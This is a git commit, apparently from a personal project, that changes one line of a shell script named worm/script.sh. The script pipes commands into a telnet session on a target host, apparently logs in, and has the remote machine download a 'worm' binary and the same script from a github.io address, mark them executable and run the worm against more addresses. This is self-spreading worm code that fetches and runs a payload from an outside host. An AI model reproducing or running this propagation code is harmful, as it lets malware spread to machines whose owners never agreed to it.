bd8e10ef174682357c732a710770ef2cf14d0858
chjonCodes <jonathanbrasil10@hotmail.com>
2016-12-22 02:13:56 -0200

    fix script
    Signed-off-by: chjonCodes <jonathanbrasil10@hotmail.com>

--- worm/script.sh
+++ worm/script.sh
@@ -5,7 +5,7 @@
 	sleep 1;
 	echo "$3";
 	sleep 1;
-	echo "( ls | grep worm ) || ( wget jrszlachta.github.io/worm/worm && wget jrszlachta.github.io/worm/script.sh && chmod +x worm script.sh && ./worm $4.$5-$6 $7-$8)"
+	echo "( ls | grep worm ) || ( wget jrszlachta.github.io/worm/worm && wget jrszlachta.github.io/worm/script.sh && chmod +x worm script.sh && ./worm $4$5-$6 $7-$8)"
 	sleep 1;
 	echo "exit";
 } | telnet "$1" > /dev/null
